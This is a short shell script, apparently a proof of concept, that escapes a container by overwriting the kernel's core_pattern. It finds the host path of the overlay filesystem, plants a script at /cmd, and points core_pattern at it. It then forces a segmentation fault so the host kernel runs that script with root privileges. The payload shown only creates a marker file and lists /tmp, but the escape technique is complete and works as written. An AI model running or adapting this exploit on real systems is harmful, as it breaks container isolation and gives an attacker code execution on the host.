#!/bin/sh
echo "Changing kernel core_pattern: "
host_path=`mount | sed -n 's/.*\perdir=\([^,]*\).*/\1/p'`
echo "Host-path: $host_path"
echo '#!/bin/sh' > /cmd
echo "touch /tmp/container-escape-core_pattern.txt" >> /cmd
echo "ls /tmp > $host_path/output.txt" >> /cmd
chmod a+x /cmd
echo "|$host_path/cmd" > /proc/sys/kernel/core_pattern
echo "Generating Segmentation fault: "
/bin/sh -c "kill -SEGV $$"
